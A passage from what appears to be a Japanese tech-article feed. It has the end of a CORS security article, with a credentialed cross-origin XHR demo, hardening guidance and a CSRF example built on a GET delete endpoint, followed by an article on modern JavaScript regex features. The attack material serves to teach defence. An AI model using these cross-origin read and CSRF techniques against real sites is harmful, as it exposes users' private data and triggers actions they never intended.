document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText
<span class="token keyword">else</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"demo_website_dontent"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token operator">=</span><span class="token string">"You need to be authenticated first"</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"https://demo.devsecurely.com/demo_cors"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
xhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>あなたのブラウザは、HTTPリクエストを直接実行するか、プリフライトリクエストを実行し、CORSポリシーをチェックするかを判断する必要がありました。これは単純なGETリクエストで、カスタムHTTPヘッダーもないのでブラウザは直接リクエストを行いました。こちらが、あなたのブラウザが送信した生のHTTPリクエストです。</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/request1.png"></p>
<p>これに対し、脆弱なウェブサイトは以下のレスポンスを送り返しました。</p>
<p><img src="https://www.devsecurely.com/blog/wp-content/uploads/2024/06/response1.png"></p>
<p>次に、ブラウザはJavaScriptコードがレスポンスにアクセスできるようにするかを判断する必要がありました。したがって、CORSポリシーのチェックを行いました。4つの条件をすべて見てみましょう。</p>
<ul>
<li>Access-Control-Allow-Originヘッダーの値には「 <a href="https://www.devsecurely.com">https://www.devsecurely.com</a> 」が設定されています。これは、Ajaxリクエストを行ったのと同じオリジンです。✅</li>
<li>リクエストは認証情報ありで行い、レスポンスにはAccess-Control-Allow-Credentialsヘッダーが存在し、値は「true」です。✅</li>
<li>リクエストはカスタムHTTPヘッダーを使用していません。そのため、ブラウザはAccess-Control-Allow-Headersヘッダーをチェックしません。✅</li>
<li>リクエストはGETリクエストを実行します。そのため、ブラウザはAccess-Control-Allow-Methodsヘッダーをチェックしません。✅</li>
</ul>
<p>CORSのチェックはすべて成功しました。したがって、ブラウザはJavaScriptがレスポンスにアクセスするのを許可します。これにより、このブログが脆弱なウェブサイト上にあるあなたの個人データにアクセスすることが可能になります。</p>
<h2>安全なCORSポリシーを定義する方法</h2>
<p>CORSポリシーは、特定のHTTPレスポンスヘッダーによって定義されます。各ヘッダーについて、値が十分に厳格であり、悪意のある活動を防げることを確認する必要があります。また、ポリシーが正当なリクエストをブロックしないようにする必要もあります。各レスポンスヘッダーの値を定義しましょう。</p>
<ul>
<li><strong>Access-Control-Allow-Origin</strong>：このヘッダーの値は、ウェブサイトの呼び出しを許可されたオリジンでなくてはいけません。例えば、<code class="language-text">https://api.example.com</code>にホストされたAPIがあり、そのAPIを呼び出す、<code class="language-text">https://www.example.com</code>にホストされたクライアントサイドアプリケーションがあるとします。このシナリオでは、<strong>Access-Control-Allow-Origin</strong>ヘッダーには常に<code class="language-text">https://www.example.com</code>が値として設定されている必要があります。
<ul>
<li>複数のウェブサイトがあなたのウェブサイトを呼び出せるようにする必要がある場合、許可されたウェブサイトのホワイトリストを定義する必要があります。すべてのリクエストに対して、<strong>Origin</strong>リクエストヘッダーにホワイトリスト上のオリジンが含まれているかどうか確認します。
<ul>
<li>含まれている場合、<strong>Origin</strong>リクエストヘッダーの値を<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーの値として返します。</li>
<li>含まれていない場合、<strong>Access-Control-Allow-Origin</strong>ヘッダーのデフォルト値を返します。</li>
</ul>
</li>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合（例えば、ウェブサイト全体が<code class="language-text">https://www.example.com</code>にホストされている場合など）、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Credentials</strong>：あなたのウェブサイトがCookie（セッションCookieなど）を使用してユーザーを認証する場合、このヘッダーの値は「true」に設定します。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Headers</strong>：リクエストにカスタムHTTPヘッダーを含める必要がある場合、このレスポンスヘッダーに追加してください。複数のHTTPヘッダーが必要な場合、カンマ区切りリストとして追加してください。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
<li><strong>Access-Control-Allow-Methods</strong>：<strong>あなたのウェブサイトがPUTまたはDELETE HTTPメソッドを扱う場合、このヘッダーにカンマ区切りリストとして追加してください</strong>。
<ul>
<li>他のオリジンがあなたのウェブサイトを呼び出せるべきでない場合、このヘッダーは定義しません。</li>
</ul>
</li>
</ul>
<p>プリフライトリクエスト（HTTP OPTIONSリクエスト）を受け取った場合、レスポンスヘッダーのみを返し、それ以外の処理は行わないようにする必要があります。</p>
<p>また、これらの変更は徐々に行ってください。各変更を行った後、ウェブサイトが正常に動作していることを確認してください。CORSの設定を厳しくしすぎると、あなたのAPI／ウェブサイト（ウェブサイトのクライアントサイドアプリケーションなど）を呼び出すクライアント側で問題が発生する可能性があります。</p>
<h2>CSRF対策としてのCORS設定</h2>
<p>先ほど説明したように、ブラウザはCORSポリシーをチェックすることなくリクエストを実行する場合があります。これは、アプリケーションのコンテキストによっては望ましくない可能性があります。</p>
<p>例えば、データを変更するGET APIコントローラーがあるとします。これは、CSRFと呼ばれる攻撃につながる可能性があります。この記事では、このタイプの脆弱性についての詳細な説明は省きますが、この問題についてより具体的に検討するために例を挙げたいと思います。</p>
<p>APIエンドポイントとして<code class="language-text">https://api.example.com/users/delete/[ID]</code>があるとします。このエンドポイントに対してGETリクエストを行うと、[ID]をIDとするユーザーがデータベースから削除されます。悪意のあるウェブサイトはこれを悪用する可能性があります。先ほどのURLに対し、認証情報を含めたAjaxリクエストを行うことができます。<code class="language-text">example.com</code>の管理者がその悪意のあるウェブサイトにアクセスすると、Ajaxリクエストが実行され、ユーザーが削除されます。</p>
<p>こうした攻撃を防ぐための回避策として、CORSチェックを使用できます。そのためには、<strong>リクエストを行う前に</strong>CORSチェックを強制する必要があります。GETリクエストの場合、それを行う唯一の方法はカスタムHTTPヘッダーを追加することです。以下に手順を示します。</p>
<ol>
<li>クライアントサイドアプリケーションで、該当するリクエストにカスタムHTTPヘッダーを追加します（あなたのAPIに対して行われるすべてのリクエストにこのヘッダーを追加してもいいかもしれません）。ヘッダーの名前と値は任意で構いません。ここでは例として「X-Requested-With: XMLHttpRequest」をヘッダーとします。</li>
<li>API側では、新しいヘッダー（X-Requested-With）が各リクエストに存在することを必ず確認するような設定にします。存在しない場合はリクエストを中断し、エラーメッセージを返します。</li>
</ol>
<p>先ほどのように悪意のあるウェブサイトがユーザーを削除したい場合、AjaxリクエストにカスタムHTTPヘッダーとして<strong>X-Requested-With</strong>を追加する必要があります。そうすることで、あなたのAPIサーバーに対してプリフライトリクエストがトリガーされます。あなたのCORSポリシーが最適な方法で定義されていれば、<strong>Access-Control-Allow-Origin</strong>レスポンスヘッダーに悪意のあるウェブサイトの名前は含まれません。したがって、CORSチェックは失敗し、ブラウザはリクエストを実行しません。</p>
<p>このトリックは、GETとPOST両方のエンドポイントをCSRF攻撃から守ることができます。</p>
<p><strong>ちなみに、GETリクエストを使用してアプリケーションに変更を加えるのは避けるべきです。GETはあくまでもデータを取得するためだけに使用するべきであり、データを変更するために使用するべきではありません</strong>。</p>
<h2>設定ミスで墓穴を掘らない</h2>
<p>SOPの仕組みは、最初からクロスオリジンリクエストを防ぐようになっています。したがって、脆弱なCORSポリシーを定義することで自らのウェブサイトを危険な状態に晒すことのないようにしましょう。</p>
<p>アプリケーションの機密性の高さによっては、CORSの設定ミスにより壊滅的な被害を受ける可能性があります。数年前、ある取引プラットフォームの侵入テストを行った際、ウェブサイトのCORSポリシーが非常に甘いことに気づきました。リスクを示すため、サイトの訪問者に特定の株を強制的に買わせる悪意のあるウェブサイトを作成しました。攻撃者はこれを使って顧客に特定の株を強制的に買わせることで、株価を吊り上げることができます。この問題をうまく悪用すれば、億万長者になれます。</p>
<p>犯罪は割りに合わないと言う人たちは、きっとCORSを理解していないのでしょう。</p>
<p>タグ付けされた記事：<a href="https://www.devsecurely.com/blog/tag/checklist">checklist</a>, <a href="https://www.devsecurely.com/blog/tag/cors">CORS</a>, <a href="https://www.devsecurely.com/blog/tag/web-application-security">web application security</a></p>]]></content:encoded></item><item><title><![CDATA[進化した正規表現：JavaScriptの正規表現の歴史と未来]]></title><description><![CDATA[クイックサマリー：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steve…]]></description><link>https://postd.cc/history-future-regular-expressions-javascript/</link><guid isPermaLink="false">https://postd.cc/history-future-regular-expressions-javascript/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[JavaScript]]></category><category><![CDATA[正規表現]]></category><pubDate>Thu, 12 Dec 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steven Levithan氏がJavaScriptの正規表現の歴史と現状を評価し、より読みやすく、保守性とレジリエンスに優れた正規表現の書き方をアドバイスします。</p>
<hr>
<p>モダンJavaScriptの正規表現は、皆さんがよく知っている従来の正規表現と比べると随分進化しました。正規表現は<strong>テキストを検索して置き換えるツールとして非常に優れている</strong>一方で、書くのも理解するのも難しいという根強い評判があります（しかし今から説明するように、この認識は時代遅れかもしれません）。</p>
<p>正規表現に関するこの認識は、JavaScriptに特に当てはまります。PCREやPerl、.NET、Java、Ruby、C++、Pythonといったよりモダンな言語の正規表現に比べてパフォーマンスが劣るJavaScriptの正規表現は、長年人気が低迷していました。しかしそれはもはや過去の話です。</p>
<p>この記事では、JavaScriptの正規表現が経てきた改良の歴史を説明し（ネタバレ：ES2018とES2024が大きな転機となりました）、モダンな正規表現の機能を実例とともに紹介します。さらに、JavaScriptの正規表現を他のモダンな言語の正規表現に匹敵する、あるいは勝るものにした軽量な<a href="https://github.com/slevithan/regex">JavaScriptライブラリ</a>について紹介し、最後にJavaScriptの今後のバージョンで正規表現を改良し続けるために現在検討されている提案をいくつかお見せします（中には現在お使いのブラウザにすでに実装されているものもあります）。</p>
<h2>JavaScriptにおける正規表現の歴史 <a href="#JavaScriptにおける正規表現の歴史略の目的">#</a><a name="JavaScriptにおける正規表現の歴史"></a></h2>
<p>1999年に標準化されたECMAScript 3は、Perl由来の正規表現をJavaScriptに導入しました。大幅な改良が加わり、正規表現はかなり便利になりましたが（他のほとんどのPerl由来の正規表現とも互換性を得ました）、それでもいくつか大きな漏れがありました。JavaScriptの次に標準化されたバージョンであるES5が登場するまで10年かかりましたが、その間に他のプログラミング言語と正規表現の実装にいくつか便利な機能が新たに追加され、それらの正規表現はより強力で読みやすくなりました。</p>
<p>しかしそれは当時の話です。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>JavaScriptの新しいバージョンが出ると、ほぼ毎回正規表現に何らかの改良が行われていたことをご存知でしたか？</p></div></div>
<p>では実際に見てみましょう。</p>
<p>以下の機能の中には理解しにくいものもあるかもしれませんが、ご心配なく。主要な機能のいくつかは後で詳しく説明します。</p>
<ul>
<li>ES5（2009）では、正規表現のリテラル文字が評価されるたびに新しいオブジェクトが作成されるようにすることで、直感的でない振る舞いが修正され、正規表現のリテラル文字が文字クラス内でスラッシュをエスケープせずに使用できるようになりました（<code class="language-text">/[/]/</code>）。</li>
<li>ES6/ES2015では2つの正規表現フラグが新たに追加されました。パーサーで正規表現を使いやすくした<code class="language-text">y</code>（<code class="language-text">sticky</code>）と、厳格なエラーとともにUnicode関連のいくつかの重要な改良を追加した<code class="language-text">u</code>（<code class="language-text">unicode</code>）です。また、<code class="language-text">RegExp.prototype.flags</code>ゲッター、<code class="language-text">RegExp</code>のサブクラス化対応、フラグを変更しながら正規表現をコピーする機能も追加されました。</li>
<li>ES2018で、JavaScriptの正規表現はかなり改良されました。<code class="language-text">s</code>（<code class="language-text">dotAll</code>）フラグ、後読み、名前付きキャプチャ、Unicodeプロパティ（ES6の<code class="language-text">u</code>フラグを必要とする<code class="language-text">\p{...}</code>と<code class="language-text">\P{...}</code>により指定）が追加されました。後で説明するように、これらはすべて極めて便利な機能です。</li>
<li>ES2020では、文字列メソッドの<code class="language-text">matchAll</code>が追加されました。これについても後ほど説明します。</li>
<li>ES2022では、マッチしたサブ文字列が開始と終了のインデックスを取得できるようにする<code class="language-text">d</code>（<code class="language-text">hasIndices</code>）フラグが追加されました。</li>
<li>最後に、ES2024ではES6で実装された<code class="language-text">u</code>フラグのアップグレードとして<code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグが追加されました。<code class="language-text">v</code>フラグは、複数文字による一連の「文字列プロパティ」を<code class="language-text">\p{...}</code>に追加し、<code class="language-text">\p{...}</code>と<code class="language-text">\q{...}</code>を使用して文字クラス内に複数文字のエレメントを追加するほか、ネストした文字クラス、差集合<code class="language-text">[A--B]</code>、積集合<code class="language-text">[A&amp;&amp;B]</code>を追加し、文字クラス内に異なるエスケープ規則を追加します。また、否定集合<code class="language-text">[^...]</code>内におけるUnicodeプロパティの大文字と小文字を区別しないマッチングも修正されました。</li>
</ul>
<p>これらの機能は、現時点で安全にコードに組み込むことが可能です。これらの中で最新の機能である<code class="language-text">v</code>フラグは、Node.js 20および<a href="https://caniuse.com/mdn-javascript_builtins_regexp_unicodesets">2023年世代</a>のブラウザでサポートされています。その他の機能は2021年以前のブラウザでサポートされています。</p>
<p>ES2019からES2023までの各エディションでは、<code class="language-text">\p{...}</code>と<code class="language-text">\P{...}</code>により指定可能なUnicodeプロパティも新たに追加されています。さらに、ES2021では文字列メソッド<code class="language-text">replaceAll</code>も追加されました。ただし、正規表現を渡された際の挙動でES3の<code class="language-text">replace</code>と唯一異なる点は、<code class="language-text">g</code>フラグを使用していない場合に例外をスローすることです。</p>
<h2>余談：正規表現の良し悪しは何で決まる？ <a href="#余談：正規表現の良し悪しは何で決まる？">#</a><a name="余談：正規表現の良し悪しは何で決まる？"></a></h2>
<p>これらの変更が実装された今、JavaScriptの正規表現は他の正規表現と比べてどうなのでしょうか。考え方は色々ありますが、主な要素を以下に挙げます。</p>
<ul>
<li>
<p><strong>パフォーマンス</strong><br>
これは重要な要素ではありますが、成熟した正規表現の実装は概ねかなり速いので、最も重要ではないかもしれません。JavaScriptは正規表現のパフォーマンスは強力ですが（少なくとも、Node.js、Chromiumベースのブラウザ、<a href="https://hacks.mozilla.org/2020/06/a-new-regexp-engine-in-spidermonkey/">さらにはFirefox</a>で採用されているV8のIrregexpエンジンや、Safariで使われているJavaScriptCoreでは優れています）、バックトラッキングを制御する構文を一切持たないバックトラッキングエンジンを使用している点が大きな制約であり、ReDoSの脆弱性が広がる要因になっています。</p>
</li>
<li>
<p><strong>一般的または重要なユースケースを扱う先進機能への対応</strong><br>
JavaScriptはES2018とES2024で先進機能への対応が大きく進みました。後読み（無限の長さに対応）やUnicodeプロパティ（複数文字による「文字列プロパティ」、差集合、積集合、スクリプト拡張機能に対応）など一部の機能において、JavaScriptは今やクラス最高レベルです。これらの機能は、他の多くの正規表現でサポートされていないか、堅牢性が劣ります。</p>
</li>
<li>
<p><strong>読みやすく保守性に優れたパターンを書ける</strong><br>
ネイティブのJavaScriptは、この点で長年主要な言語の中で最低の評価を受けてきました。その理由は、ちょっとした空白やコメントを入力できるようにする<code class="language-text">x</code>（拡張）フラグが欠けているからです。正規表現のサブルーチンとサブルーチン定義グループ（PCREとPerlの機能）は、文法的に正しい正規表現を書き、合成により複雑なパターンを構築することを可能にする強力な機能ですが、これらもありません。</p>
</li>
</ul>
<p>つまり、良い面も悪い面もあるということです。</p>
<blockquote class=pull-quote><p><a class=pull-quote__link aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aJavaScript%20regexes%20have%20become%20exceptionally%20powerful,%20but%20they%e2%80%99re%20still%20missing%20key%20features%20that%20could%20make%20regexes%20safer,%20more%20readable,%20and%20more%20maintainable%20%28all%20of%20which%20hold%20some%20people%20back%20from%20using%20this%20power%29.%0a&url=https://smashingmagazine.com%2f2024%2f08%2fhistory-future-regular-expressions-javascript%2f">JavaScriptの正規表現は極めて強力になりましたが、正規表現をより安全で、読みやすく、保守しやすくできる重要な機能がまだ欠けています（これは、その力を利用するのをためらう理由にもなっています）</a></p></blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p>幸い、これらの穴はすべてJavaScriptライブラリによって埋めることができます。それについては後ほど説明します。</p>
<h2>JavaScriptのモダンな正規表現機能を使用する <a href="#JavaScriptのモダンな正規表現機能を使用する">#</a><a name="JavaScriptのモダンな正規表現機能を使用する"></a></h2>
<p>皆さんがあまり知らないかもしれない、もっと便利なモダン正規表現機能をいくつかご紹介します。先に言っておきますが、<strong>これはやや上級者向けのガイドです</strong>。正規表現を使い始めてまだ日が浅い方は、手始めに以下の素晴らしいチュートリアルをご覧いただくといいかもしれません。</p>
<ul>
<li><a href="https://regexlearn.com/">RegexLearn</a>と<a href="https://regexone.com/">RegexOne</a>はインタラクティブなチュートリアルで、練習問題もあります。</li>
<li>JavaScript.infoの<a href="https://javascript.info/regular-expressions">正規表現の章</a>は、JavaScriptに特化した詳細なガイドです。</li>
<li><a href="https://www.youtube.com/watch?v=M7vDtxaD7ZU">Demystifying Regular Expressions</a>（動画）は、Lea Verou氏がHolyJS 2017で行った、初心者向けの素晴らしい講演です。</li>
<li><a href="https://www.youtube.com/watch?v=rhzKDrUiJVk">Learn Regular Expressions In 20 Minutes</a>は、実際に正規表現テスターを動かしながら構文を説明する動画です。</li>
</ul>
<h2>名前付きキャプチャ <a href="#名前付きキャプチャ">#</a><a name="名前付きキャプチャ"></a></h2>
<p>正規表現が一致するかどうかを確認するだけでなく、一致する文字列からサブ文字列を抽出し、コード上で何らかの操作を行いたい場合も多いでしょう。名前付きキャプチャグループを使うことで、正規表現とコードが<strong>より読みやすく</strong>なり、<strong>自己文書化</strong>するような方法でそれを行うことができます。</p>
<p>以下の例では、2つの日付を持つレコードをマッチングさせ、値を取得します。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^Admitted: (?&lt;admitted>\d{4}-\d{2}-\d{2})\nReleased: (?&lt;released>\d{4}-\d{2}-\d{2})$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* → {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>この正規表現を理解できなくても大丈夫です。これをもっと読みやすくする方法を後で説明します。ここで重要なのは、名前付きキャプチャグループが<code class="language-text">(?&lt;name>...)</code>構文を使用し、マッチした文字列の<code class="language-text">groups</code>オブジェクト上にその結果が格納されるということです。</p>
<p>また、名前付き後方参照を使用して、名前付きキャプチャグループが<code class="language-text">\k&lt;name></code>によりマッチングした文字列を再度マッチングすることもでき、検索や置換の中でそれらの値を以下のように使用することができます。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Change 'FirstName LastName' to 'LastName, FirstName'</span>
<span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'Shaquille Oatmeal'</span><span class="token punctuation">;</span>
name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;first>\w+) (?&lt;last>\w+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">'$&lt;last>, $&lt;first>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'Oatmeal, Shaquille'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>置換コールバック関数内で名前付き後方参照を使用したい上級者は、最後の引数として<code class="language-text">groups</code>オブジェクトを指定します。以下に例を挙げます。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;degrees>-?\d+(\.\d+)?)F\b</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> groups <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span>groups<span class="token punctuation">.</span>degrees <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token operator">/</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'98.6F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → '37C'</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'May 9 high is 40F and low is 21F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'May 9 high is 4C and low is -6C'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>後読み <a href="#後読み">#</a><a name="後読み"></a></h2>
<p>後読み（ES2018で導入）は、JavaScriptの正規表現で以前からサポートされていた先読みを補完する機能です。先読みと後読みはアサーション（文字列の始まりを示す<code class="language-text">^</code>や、単語の境界を示す<code class="language-text">\b</code>と似ています）であり、マッチの過程で文字を一切消費しません。後読みは、サブパターンが現在のマッチ位置の直前に見つかるかどうかで成否が決まります。</p>
<p>例えば、以下の正規表現は後読み<code class="language-text">(?&lt;=...)</code>を使用して、「fat」の後に続く「cat」という単語（「cat」という単語のみ）をマッチングします。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;=fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'cat, fat pigeon, brat cat'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>また、否定後読み<code class="language-text">(?&lt;!...)</code>を使用してアサーションを反転させることもできます。そうすることで、正規表現は前に「fat」が付かないすべての「cat」をマッチングするようになります。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;!fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'pigeon, fat cat, brat pigeon'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>後読みの実装はJavaScriptのものが最も優れています（匹敵するのは.NETだけです）。他の正規表現は後読みの中に可変長パターンを認めるかどうか、いつ認めるかについて一貫性のない複雑な規則を設けていますが、JavaScriptはあらゆるサブパターンについて後読みを認めています。</p>
<h2><code class="language-text">matchAll</code>メソッド <a href="#matchAllメソッド">#</a><a name="matchAllメソッド"></a></h2>
<p>ES2020ではJavaScriptの<code class="language-text">String.prototype.matchAll</code>が追加され、詳細なマッチ情報が必要な場合に正規表現マッチをループで実行しやすくなりました。以前は他の方法も利用できましたが、<code class="language-text">matchAll</code>の方が容易な場合が多く、長さゼロのマッチを返す可能性がある正規表現の結果に対してループ実行する際に無限ループに陥らないようにするなど、落とし穴も回避します。</p>
<p><code class="language-text">matchAll</code>はイテレータ（配列ではなく）を返すため、<code class="language-text">for...of</code>ループにおいて使いやすいという利点があります。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;char1>\w)(?&lt;char2>\w)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> match <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span>char1<span class="token punctuation">,</span> char2<span class="token punctuation">}</span> <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">;</span>
  <span class="token comment">// Print each complete match and matched subpatterns</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Matched "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" with "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" and "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char2<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>注</strong>：正規表現で<code class="language-text">matchAll</code>を使用する場合、<code class="language-text">g</code>フラグ（<code class="language-text">global</code>）が必須となります。また、他のイテレータと同様に<code class="language-text">Array.from</code>または配列スプレッドを使用してすべての結果を配列として受け取ることも可能です。</p>
